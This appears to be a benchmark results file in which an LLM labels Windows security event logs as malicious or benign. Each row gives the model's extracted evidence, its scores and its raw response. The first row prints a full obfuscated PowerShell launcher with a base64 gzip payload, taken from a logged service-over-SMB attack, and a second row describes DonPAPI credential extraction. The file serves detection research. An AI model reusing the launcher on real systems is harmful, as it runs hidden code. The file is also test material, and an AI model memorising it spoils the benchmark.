# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,79.8,YES,"5140, 5145, 4697, 4688","System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\services.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\conhost.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe, C:\Windows\System32\SecEdit.exe, C:\Windows\System32\MusNotification.exe, C:\Windows\System32\svchost.exe","admmig, SRVDEFENDER01$, LocalSystem","%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &amp | ([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | "", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display","srvdefender01.offsec.lan, 10.23.123.11",,0.0,59.78,4.8,6.0,4.0,3,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5140, 5145, 4697, 4688
- Processes: System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\services.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\conhost.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe, C:\Windows\System32\SecEdit.exe, C:\Windows\System32\MusNotification.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, SRVDEFENDER01$, LocalSystem
- Commands: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display
- Network: srvdefender01.offsec.lan, 10.23.123.11
- Registry: None

EXPLANATION:
The events show admmig accessing \\*\IPC$ and \\*\ADMIN$ from 10.23.123.11, then accessing svcctl and installing a service that runs hidden PowerShell with nop, noni, GzipStream, and FromBase64String. The subsequent process chain from services.exe to cmd.exe to powershell.exe and SysWOW64 PowerShell running as SRVDEFENDER01$ is consistent with malicious remote service execution rather than routine monitoring activity."
gpt-5.5-2026-04-23,ID5145-4624-DonPAPI full extraction.csv,,,processed,YES,100.0,70.8,YES,"1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662","C:\Windows\System32\svchost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON, admmig, NetworkService, LOCAL SERVICE","C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff","fs03vuln.offsec.lan, 10.23.123.11",,0.0,23.83,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662
- Processes: C:\Windows\System32\svchost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON, admmig, NetworkService, LOCAL SERVICE
- Commands: C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: fs03vuln.offsec.lan, 10.23.123.11
- Registry: None

EXPLANATION:
The pattern is malicious because the Security log was cleared by hack1, followed by repeated privileged network logons by admmig from 10.23.123.11 with access to \\*\C$, \\*\ADMIN$, \\*\IPC$, RemoteRegistry, svcctl, and winreg. The same activity includes creation of C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", temporary files under SYSTEM32, and extensive access to credential, vault, browser, UltraVNC, mRemoteNG, and user profile locations."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-services-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc"", C:\Windows\Explorer.EXE",WIN-FPV0DSIC9O6,,0.0,7.40,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc"", C:\Windows\Explorer.EXE
- Network: WIN-FPV0DSIC9O6
- Registry: None

EXPLANATION:
The event shows WIN-FPV0DSIC9O6\Administrator launching Microsoft Management Console with services.msc from C:\Windows\explorer.exe. This is consistent with routine administrative activity for managing Windows services, and there is no evidence of suspicious commands, registry modification, or network activity in the provided log."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-eventvwr-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, C:\Windows\Explorer.EXE",,,0.0,5.32,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, C:\Windows\Explorer.EXE
- Network: None
- Registry: None

EXPLANATION:
The event shows Microsoft Management Console launching Event Viewer from explorer.exe under WIN-FPV0DSIC9O6\Administrator. There are no additional events, suspicious commands, network indicators, registry changes, or privilege escalation patterns in the provided data."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-secpol-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe""",WIN-FPV0DSIC9O6,,0.0,9.52,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s, ""C:\Windows\system32\ServerManager.exe""
- Network: WIN-FPV0DSIC9O6
- Registry: None

EXPLANATION:
This event shows WIN-FPV0DSIC9O6\Administrator launching Microsoft Management Console with secpol.msc from ServerManager.exe. Based only on this event, it appears consistent with routine administrative activity and does not show attack behavior."
gpt-5.5-2026-04-23,BENIGN-ID1-rundll32-appxdeploymentextensions-onecore-dll-shellrefres.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM","rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc",,,0.0,6.19,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM
- Commands: rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc
- Network: None
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\rundll32.exe running a ShellRefresh command for AppXDeploymentExtensions.OneCore.dll, launched by C:\Windows\System32\svchost.exe with the AppXSvc service command line. This appears consistent with Windows AppX service activity and there is no network, registry, or suspicious command evidence in the provided event."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-comexp-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"" , ""C:\Windows\system32\ServerManager.exe""",,,0.0,5.06,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"" , ""C:\Windows\system32\ServerManager.exe"" 
- Network: None
- Registry: None

EXPLANATION:
This event shows Microsoft Management Console launching comexp.msc from ServerManager.exe under the Administrator account. The processes and command lines are consistent with routine administrative use of Windows management tools, with no network, registry, or suspicious command evidence present."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-gpedit-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe",,,0.0,4.30,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc, sihost.exe
- Network: None
- Registry: None

EXPLANATION:
This event shows Microsoft Management Console launching gpedit.msc under WIN-FPV0DSIC9O6\Administrator. Based only on this single process creation event, it appears consistent with routine local Group Policy Editor usage and there is no additional evidence of attack behavior."
gpt-5.5-2026-04-23,BENIGN-ID1-dism-online.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\Dism.exe, DISM.EXE",WIN-FPV0DSIC9O6\Administrator,"C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all",WIN-FPV0DSIC9O6,,0.0,8.80,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\Dism.exe, DISM.EXE
- Accounts: WIN-FPV0DSIC9O6\Administrator
- Commands: C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all
- Network: WIN-FPV0DSIC9O6
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\Dism.exe running as WIN-FPV0DSIC9O6\Administrator to enable DNS Server features. Based only on this single event, it appears consistent with routine Windows role installation activity and does not show an attack pattern."
gpt-5.5-2026-04-23,BENIGN-ID1-reg-query.csv,,,processed,NO,100.0,90.0,YES,1,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64",WIN-FPV0DSIC9O6.sigma.fr,hklm\software\microsoft\windows\softwareinventorylogging,0.0,7.88,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
- Network: WIN-FPV0DSIC9O6.sigma.fr
- Registry: hklm\software\microsoft\windows\softwareinventorylogging

EXPLANATION:
The event shows NT AUTHORITY\SYSTEM running reg.exe via cmd.exe to query the hklm\software\microsoft\windows\softwareinventorylogging registry key. This is a registry query for collectionstate and there is no evidence in the provided log of persistence, privilege escalation, credential access, or other malicious behavior."
gpt-5.5-2026-04-23,BENIGN-ID1-regsvr32-s.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\regsvr32.exe, C:\Windows\System32\spoolsv.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll"", C:\Windows\System32\spoolsv.exe",WIN-FPV0DSIC9O6.sigma.fr,,0.0,6.14,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\regsvr32.exe, C:\Windows\System32\spoolsv.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll"", C:\Windows\System32\spoolsv.exe
- Network: WIN-FPV0DSIC9O6.sigma.fr
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\spoolsv.exe launching C:\Windows\System32\regsvr32.exe to silently register ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll"" as NT AUTHORITY\SYSTEM. Based only on this single event, the process relationship and DLL path are consistent with print spooler driver activity, and there is no additional evidence of malicious behavior."
gpt-5.5-2026-04-23,BENIGN-ID1-rundll32-c-windows-system32-shell32-dll-shcreatelocalserv.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe","SIGMA\Administrator, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p",WIN-FPV0DSIC9O6.sigma.fr,,0.0,11.46,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\rundll32.exe, C:\Windows\System32\svchost.exe
- Accounts: SIGMA\Administrator, NT AUTHORITY\SYSTEM
- Commands: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
- Network: WIN-FPV0DSIC9O6.sigma.fr
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\rundll32.exe launched with shell32.dll,SHCreateLocalServerRunDll and -Embedding from C:\Windows\System32\svchost.exe -k DcomLaunch -p. This pattern is consistent with a DCOM-launched Windows component and there is no command, registry, or network evidence in the log indicating attack behavior."
gpt-5.5-2026-04-23,BENIGN-ID1-mmc-c-windows-system32-compmgmt-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, mmc.exe, C:\Windows\System32\ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s, ""C:\Windows\system32\ServerManager.exe""",WIN-FPV0DSIC9O6.sigma.fr,,0.0,8.69,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\mmc.exe, mmc.exe, C:\Windows\System32\ServerManager.exe
- Accounts: SIGMA\Administrator
- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s, ""C:\Windows\system32\ServerManager.exe""
- Network: WIN-FPV0DSIC9O6.sigma.fr
- Registry: None

EXPLANATION:
The event shows SIGMA\Administrator launching Microsoft Management Console with the Computer Management snap-in from Server Manager. This is consistent with routine administrative activity, and there is no additional evidence of attack behavior in the provided log."
